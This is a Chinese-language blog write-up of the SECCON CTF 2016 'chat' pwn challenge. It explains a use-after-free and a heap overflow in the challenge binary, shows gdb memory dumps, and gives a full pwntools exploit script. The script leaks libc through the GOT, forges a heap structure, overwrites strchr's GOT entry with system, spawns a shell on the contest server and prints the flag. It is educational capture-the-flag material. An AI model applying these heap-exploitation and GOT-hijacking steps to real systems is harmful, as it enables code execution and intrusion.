<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">$ ./chat</span><br><span class="line">Simple Chat Service</span><br><span class="line"></span><br><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 1</span><br><span class="line">name &gt; userA</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 1</span><br><span class="line">name &gt; userB</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 2</span><br><span class="line">name &gt; userA</span><br><span class="line">Hello, userA!</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">Service Menu</span><br><span class="line"></span><br><span class="line">1 : Show TimeLine       2 : Show DM     3 : Show UsersList</span><br><span class="line">4 : Send PublicMessage  5 : Send DirectMessage</span><br><span class="line">6 : Remove PublicMessage                7 : Change UserName</span><br><span class="line">0 : Sign Out</span><br><span class="line">menu &gt;&gt; 5</span><br><span class="line">name &gt;&gt; userB</span><br><span class="line">message &gt;&gt; from a</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>

<p>我們可以註冊並登入 user，登入之後可以查看訊息，發 tweet ( public message ) 或是 DM 別人。上面的例子我們用 <code>userA</code> DM 了一條訊息給 <code>userB</code> ，之後我們登入 userB 並查看訊息 :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 2</span><br><span class="line">name &gt; userB</span><br><span class="line">Hello, userB!</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">Service Menu</span><br><span class="line"></span><br><span class="line">1 : Show TimeLine       2 : Show DM     3 : Show UsersList</span><br><span class="line">4 : Send PublicMessage  5 : Send DirectMessage</span><br><span class="line">6 : Remove PublicMessage                7 : Change UserName</span><br><span class="line">0 : Sign Out</span><br><span class="line">menu &gt;&gt; 2</span><br><span class="line">Direct Messages</span><br><span class="line">[userA] from a</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>
<p>可以看到 <code>userB</code> 所擁有的 DM 都會顯示 sender 的名字與訊息內容</p>
<p>程式主要有兩個 data structure，用來存 user 和 message :</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">user</span> &#123;</span></span><br><span class="line">  <span class="type">char</span> *name;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">message</span> *<span class="title">msg</span>;</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">next_user</span>;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span> &#123;</span></span><br><span class="line">  <span class="type">int</span> id ; <span class="comment">// use in tweet (public message) only</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">user</span> *<span class="title">sender</span>;</span></span><br><span class="line">  <span class="type">char</span> content[<span class="number">128</span>];</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">message</span> *<span class="title">next_msg</span>;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>這邊要注意的是 user 的 name 有些限制。除了長度限制 32 byte 之外，<strong>每個 name 的第一個字元還必須是 printable 的字元</strong> ( 程式會用 <a target="_blank" rel="noopener" href="http://www.cplusplus.com/reference/cctype/isprint/">isprint</a> 函式來檢查 )</p>
<p>這樣的限制直接影響到了 <code>Change UserName</code> 這個功能。在更改 user name 的時候，如果程式發現 user name 的第一個字元不是 printable 的字元，程式會將這個 user 給 remove 掉。</p>
<p>所以如果我們先用 <code>userA</code> DM 一個訊息給 <code>userB</code>，然後將 <code>userA</code> 給 remove 掉的話，會發生什麼事呢?</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 2</span><br><span class="line">name &gt; userA</span><br><span class="line">Hello, userA!</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">Service Menu</span><br><span class="line"></span><br><span class="line">1 : Show TimeLine       2 : Show DM     3 : Show UsersList</span><br><span class="line">4 : Send PublicMessage  5 : Send DirectMessage</span><br><span class="line">6 : Remove PublicMessage                7 : Change UserName</span><br><span class="line">0 : Sign Out</span><br><span class="line">menu &gt;&gt; 7</span><br><span class="line">name &gt;&gt;            &lt;-- here we input &#x27;\t&#x27;, which did not pass the isprint check</span><br><span class="line">Change name error...</span><br><span class="line">Bye, </span><br><span class="line"></span><br><span class="line">1 : Sign Up     2 : Sign In</span><br><span class="line">0 : Exit</span><br><span class="line">menu &gt; 2</span><br><span class="line">name &gt; userB</span><br><span class="line">Hello, userB!</span><br><span class="line">Success!</span><br><span class="line"></span><br><span class="line">Service Menu</span><br><span class="line"></span><br><span class="line">1 : Show TimeLine       2 : Show DM     3 : Show UsersList</span><br><span class="line">4 : Send PublicMessage  5 : Send DirectMessage</span><br><span class="line">6 : Remove PublicMessage                7 : Change UserName</span><br><span class="line">0 : Sign Out</span><br><span class="line">menu &gt;&gt; 2</span><br><span class="line">Direct Messages</span><br><span class="line">[] from a       &lt;-- strange sender&#x27;s name</span><br><span class="line">Done.</span><br></pre></td></tr></table></figure>
<p>我們可以發現當我們查看 <code>userB</code> 的 DM 時，sender 的名字會怪怪的。這是因為我們已經將 <code>userA</code> 給 remove 掉了，導致 <code>userA-&gt;name</code> 這塊 buffer 被 free 掉，但是透過查看 <code>userB</code> 的 DM，我們還是有辦法去 access 到 這塊 buffer ( <code>userB-&gt;messsage-&gt;sender-&gt;name</code> )。因此，這是一個典型的 Use-After-Free 漏洞。</p>
<p>此外，在註冊一個 user 時，設定 user name 的時候程式會使用 <code>strdup()</code> 來配置一塊 buffer 給 <code>user-&gt;name</code>。如果我們設定 user name 的長度小於 24 的話，<code>strdup()</code> 會回給我們一個 size 為 <code>0x20</code> 的 memory chunk ( fastbin[0] )，此時這塊 buffer 最多只被允許輸入 24 個字元。但是在修改 user name 的時候，程式卻允許我們輸入最多  32 個字元，造成 heap overflow。 </p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>首先是利用 UAF 來 leak 一些資訊。如果我們可以排一下 heap，使得其中一個 user ( ex. <code>userC</code> ) 的 name buffer 與 <code>userB-&gt;message-&gt;sender</code> 重疊的話 : </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">                       +--------------+</span><br><span class="line">userB-&gt;message-&gt;sender | char *p_name | userC-&gt;name</span><br><span class="line">                       |              |</span><br><span class="line">                       +----+---------+</span><br><span class="line">                            |</span><br><span class="line">            +---------------+</span><br><span class="line">            |</span><br><span class="line">            |          +-----------+</span><br><span class="line">            +-&gt; p_name |sender_name|</span><br><span class="line">                       |    .      |</span><br><span class="line">                       |    .      |</span><br><span class="line">                       |    .      |</span><br><span class="line">                       +-----------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>我們就可以透過修改 <code>userC-&gt;name</code> 的內容來去控制 <code>p_name</code> 這個 data pointer，之後透過查看 <code>userB</code> 的 DM 來去 leak 一些資訊。這部分只要對 fastbin 的 allocate 順序有些概念的話應該很快就可以排出來了。</p>
<p>排完之後我們就可以將 <code>p_name</code> 這個 pointer 改成 <code>__libc_start_main@got.plt</code> (<code>0x603040</code>，第一個字元 <code>0x40</code> 為 printable 字元所以可以更改成功 )，然後 leak 出 libc 的 base address。</p>
<p>接下來是任意寫。這部分就花了比較多的時間，主要是當時還沒有發現 heap overflow 的洞，能做的就是不斷地 fuzzing + 觀察 heap 的排列情形。直到排出下列的 heap 時才發現 name 那邊可以 overflow :</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">          +--------------+</span><br><span class="line">0x1234050 |              | userC-&gt;name</span><br><span class="line">          +--------------+</span><br><span class="line">          |              |</span><br><span class="line">          +--------------+</span><br><span class="line">0x1234060 |              | unsortbin &lt;-- oh yeah</span><br><span class="line">          +--------------+</span><br><span class="line">0x1234068 |          0x21|</span><br><span class="line">          +--------------+</span><br><span class="line">          |     .        |</span><br><span class="line">          |     .        |</span><br><span class="line">          |     .        |</span><br><span class="line">          |     .        |</span><br><span class="line">          |     .        |</span><br><span class="line">0x1234090 |     0x1234050| userC</span><br><span class="line">          |              |</span><br><span class="line">          |              |</span><br><span class="line">          |              |</span><br><span class="line">          +--------------+</span><br></pre></td></tr></table></figure>

<p><code>0x1234060</code> 這個 chunk 位於 unsortbin 裡面，其 size 可以透過 overflow <code>userC-&gt;name</code> 來更改。如果我們將 size 改成 <code>0xa1</code> ( struct <code>message</code> 的大小 )，之後在 post message 的時候就可以透過控制 message 的內容來偽造 <code>userC</code> 這個 structure，把 <code>userC-&gt;name</code> 這個 pointer 改掉，之後透過修改 <code>userC</code> 的 name 來達到任意寫入。</p>
<p>總結一下如何達到任意寫 :</p>
<ol>
<li>排出上圖的 heap</li>
<li>overflow <code>userC-&gt;name</code>，將 unsortbin 中的 chunk size 從 <code>0x21</code> 改成 <code>0xa1</code></li>
<li>發布一個訊息，讓程式 allocate <code>0x1234060</code> 這個 chunk，之後控制訊息內容來偽造 <code>userC</code> 這個 structure (位於 <code>0x1234090</code>)</li>
<li>將 <code>userC-&gt;name</code> 這個 pointer 改掉，改成任意 address，之後再透過修改 <code>userC</code> 的 name 來達到任意寫</li>
</ol>
<p>有了任意寫就可以做 GOT hijacking 了。這題可以 hijack 的地方很多，有 <code>free</code>, <code>strcmp</code>, <code>strchr</code>, <code>atoi</code>……等等。</p>
<p>看起來似乎很容易，其實沒那麼簡單。前面有提到，如果要成功更改一個 user name，不管是舊 user name 還是新 user name，其第一個字元都必須是 printable 的字元。假設今天我們要 hijack free 的 GOT:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ tel 0x603010</span><br><span class="line">00:0000|  0x603010 --&gt; 0x7eff900f44a0 (&lt;_dl_runtime_resolve&gt;:   sub    rsp,0x38)</span><br><span class="line">01:0008|  0x603018 --&gt; 0x7eff8fd9bd00 (&lt;__GI___libc_free&gt;:      mov    rax,QWORD PTR [rip+0x33b1e1]        # 0x7eff900d6ee8)</span><br><span class="line">02:0016|  0x603020 --&gt; 0x7eff8fda19b0 (&lt;strlen&gt;:        pxor   xmm8,xmm8)</span><br><span class="line">03:0024|  0x603028 --&gt; 0x4007f6 (&lt;__stack_chk_fail@plt+6&gt;:      push   0x2)</span><br><span class="line">04:0032|  0x603030 --&gt; 0x7eff8fd8b100 (&lt;setbuf&gt;:        mov    edx,0x2000)</span><br><span class="line">05:0040|  0x603038 --&gt; 0x7eff8fd9fd40 (&lt;__strchr_sse2&gt;: movd   xmm1,esi)</span><br><span class="line">06:0048|  0x603040 --&gt; 0x7eff8fd3ae50 (&lt;__libc_start_main&gt;:     push   r14)</span><br><span class="line">07:0056|  0x603048 --&gt; 0x7eff8fd87160 (&lt;_IO_fgets&gt;:     push   r12)</span><br></pre></td></tr></table></figure>

<p>我們可以看到 free 的 GOT ( <code>0x603018</code> )，他存的 address 是 <code>0x7eff8fd9bd00</code>。其第一個字元是 <code>0x00</code>，不是 printable 的字元，因此在透過 <code>Change UserName</code> 更改 <code>free@got.plt</code> 的時候會失敗。就算今天 free 的 GOT 所存的 address 其第一個字元是 printable 的字元，但是這題 libc 的 <code>system</code> offset 為 <code>0x46590</code>，其第一個字元同樣不是 printable 的字元，這會讓程式認為新名字無效並嘗試去 free 掉 user name，導致程式 crash 掉 ( 嘗試去 free 掉一個 GOT entry 的關係 )。</p>
<p>那麼該如何繞過這項檢查呢 ? 個人覺得這邊還蠻有趣的。首先就是有發現到 <code>stack_chk_fail</code> 的 GOT 存的內容是 <code>0x4007f6</code>。雖然 <code>0xf6</code> 並非 printable 的字元，但是第三個字元 <code>0x40</code> 卻可以通過 <code>isprint</code> 的檢查。因此只要想辦法讓 <code>0x40</code> 成為舊 user name 的第一個字元就行了:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ tel 0x60302a</span><br><span class="line">00:0000|  0x60302a --&gt; 0xb100000000000040 &lt;-- printable first character !</span><br><span class="line">01:0008|  0x603032 --&gt; 0xfd4000007eff8fd8 </span><br><span class="line">02:0016|  0x60303a --&gt; 0xae5000007eff8fd9 </span><br><span class="line">03:0024|  0x603042 --&gt; 0x716000007eff8fd3 </span><br><span class="line">04:0032|  0x60304a --&gt; 0x8e0000007eff8fd8 </span><br><span class="line">05:0040|  0x603052 --&gt; 0xd2b000007eff8fe5 </span><br><span class="line">06:0048|  0x60305a --&gt; 0x86600007eff8fd6 </span><br><span class="line">07:0056|  0x603062 --&gt; 0x8e80000000000040</span><br></pre></td></tr></table></figure>
<p>我們可以從 <code>0x60302a</code> 開始做寫入，前面先塞一些 printable 的字元填滿 <code>stack_chk_fail</code> 和 <code>setbuf</code> 的 GOT ( 這樣新 user name 的第一個字元也變成 printable 的了 ! )，之後再將 <code>system</code> 的 address 塞到 <code>strchr@got.plt</code> 裡面，即可成功 hijack <code>strchr</code> 的 GOT。</p>
<figure class="highlight python"><figcaption><span>exp_chat.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&quot;chat.pwn.seccon.jp&quot;</span></span><br><span class="line">PORT = <span class="number">26895</span></span><br><span class="line">ELF_PATH = <span class="string">&quot;./chat&quot;</span></span><br><span class="line">LIBC_PATH = <span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span> <span class="comment"># ubuntu 14.04 64bit</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># setting </span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.endian = <span class="string">&#x27;little&#x27;</span></span><br><span class="line">context.word_size = <span class="number">32</span></span><br><span class="line"><span class="comment"># [&#x27;CRITICAL&#x27;, &#x27;DEBUG&#x27;, &#x27;ERROR&#x27;, &#x27;INFO&#x27;, &#x27;NOTSET&#x27;, &#x27;WARN&#x27;, &#x27;WARNING&#x27;]</span></span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;INFO&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(ELF_PATH)</span><br><span class="line">libc = ELF(LIBC_PATH)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signup</span>(<span class="params">name</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signin</span>(<span class="params">name</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tweet</span>(<span class="params">msg</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dm</span>(<span class="params">user, msg</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, user)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">signout</span>():</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;0&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_name</span>(<span class="params">name</span>):</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;7&quot;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line"></span><br><span class="line">    r = remote(HOST, PORT)</span><br><span class="line">    <span class="comment">#r = process(ELF_PATH)</span></span><br><span class="line"></span><br><span class="line">    signup(<span class="string">&quot;A&quot;</span>*<span class="number">4</span>) <span class="comment"># fastbin[0] * 2</span></span><br><span class="line">    signup(<span class="string">&quot;B&quot;</span>*<span class="number">4</span>) <span class="comment"># fastbin[0] * 2</span></span><br><span class="line">    signup(<span class="string">&quot;C&quot;</span>*<span class="number">30</span>) <span class="comment"># fastbin[0] * 1 + fastbin[1] * 1 </span></span><br><span class="line"></span><br><span class="line">    signin(<span class="string">&quot;A&quot;</span>*<span class="number">4</span>)</span><br><span class="line">    tweet(<span class="string">&quot;aaaa&quot;</span>) </span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    signin(<span class="string">&quot;B&quot;</span>*<span class="number">4</span>)</span><br><span class="line">    tweet(<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">    dm(<span class="string">&quot;A&quot;</span>*<span class="number">4</span>, <span class="string">&quot;BA&quot;</span>) <span class="comment"># for creating dangling pointer</span></span><br><span class="line">    dm(<span class="string">&quot;C&quot;</span>*<span class="number">30</span>, <span class="string">&quot;BC&quot;</span>)</span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    signin(<span class="string">&quot;C&quot;</span>*<span class="number">30</span>)</span><br><span class="line">    tweet(<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    signin(<span class="string">&quot;B&quot;</span>*<span class="number">4</span>)</span><br><span class="line">    change_name(<span class="string">&quot;\t&quot;</span>) <span class="comment"># invalid, will remove user (user AAAA&#x27;s DM become dangling pointer)</span></span><br><span class="line"></span><br><span class="line">    signin(<span class="string">&quot;C&quot;</span>*<span class="number">30</span>)</span><br><span class="line">    change_name(<span class="string">&quot;\t&quot;</span>) </span><br><span class="line"></span><br><span class="line">    signup(<span class="string">&quot;d&quot;</span>*<span class="number">7</span>)</span><br><span class="line">    signin(<span class="string">&quot;d&quot;</span>*<span class="number">7</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="number">6</span>,<span class="number">2</span>,-<span class="number">1</span>): <span class="comment"># null out the address</span></span><br><span class="line">        change_name(<span class="string">&quot;d&quot;</span>*i)</span><br><span class="line"></span><br><span class="line">    malusr = p64(elf.got[<span class="string">&#x27;__libc_start_main&#x27;</span>])</span><br><span class="line">    change_name(malusr) <span class="comment"># AAAA&#x27;s DM&#x27;s sender-&gt;name will pointer to __libc_start_main@got.plt</span></span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># leak libc</span></span><br><span class="line">    signin(<span class="string">&quot;A&quot;</span>*<span class="number">4</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>) <span class="comment"># show DM, leak libc</span></span><br><span class="line">    r.recvuntil(<span class="string">&quot;[&quot;</span>)</span><br><span class="line">    libc.address += u64(r.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)) - libc.symbols[<span class="string">&#x27;__libc_start_main&#x27;</span>]</span><br><span class="line">    system_addr = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    log.success(<span class="string">&quot;libc base: &quot;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line">    log.success(<span class="string">&quot;system: &quot;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">    signout()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># overflow name buf and overwrite an unsortbin chunk&#x27;s size</span></span><br><span class="line">    <span class="comment"># enlarge the size, so we can overflow the heap buffer and fake some data structure</span></span><br><span class="line">    signin(malusr)</span><br><span class="line">    change_name(<span class="string">&quot;i&quot;</span>*<span class="number">24</span>+p8(<span class="number">0xa1</span>)) <span class="comment"># padding + fake size</span></span><br><span class="line">    tweet(<span class="string">&quot;fuck&quot;</span>) <span class="comment"># will allocate chunk from smallbin</span></span><br><span class="line">    change_name(p8(<span class="number">0x40</span>)) <span class="comment"># make this user into right index</span></span><br><span class="line">    tweet(<span class="string">&quot;7&quot;</span>*<span class="number">16</span>+p64(<span class="number">0x60302a</span>)) <span class="comment"># allocate chunk from unsortbin, overwrite data structure. We can now start overwriting memory from 0x60302a</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># start overwriting, we wish to overwrite strchr&#x27;s got</span></span><br><span class="line">    change_name(<span class="string">&quot;A&quot;</span>*<span class="number">6</span>+<span class="string">&quot;B&quot;</span>*<span class="number">8</span>+p64(system_addr)) <span class="comment"># padding + padding + strchr&#x27;s got (overwrite to system)</span></span><br><span class="line">    r.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;sh\x00&quot;</span>) <span class="comment"># strchr(&quot;sh&quot;, 10) --&gt; system(&quot;sh&quot;)</span></span><br><span class="line"></span><br><span class="line">    r.interactive()</span><br></pre></td></tr></table></figure>


<p>flag: <code>SECCON&#123;51mpl3_ch47_l1k3_7w1*73*&#125;</code></p>

          
        
      
    </div>
    
    
    

    


    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="https://blog.feedscoin.com/SECCON-CTF-2016-Quals-checker-300/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="逐流小站">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/SECCON-CTF-2016-Quals-checker-300/" itemprop="url">[SECCON CTF 2016 Quals] checker 300</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">Posted on</span>
              
              <time title="Post created" itemprop="dateCreated datePublished" datetime="2016-12-15T22:02:00+08:00">
                2016-12-15
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">In</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/write-ups/" itemprop="url" rel="index">
                    <span itemprop="name">write-ups</span>
                  </a>
                </span>

                
                

              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">
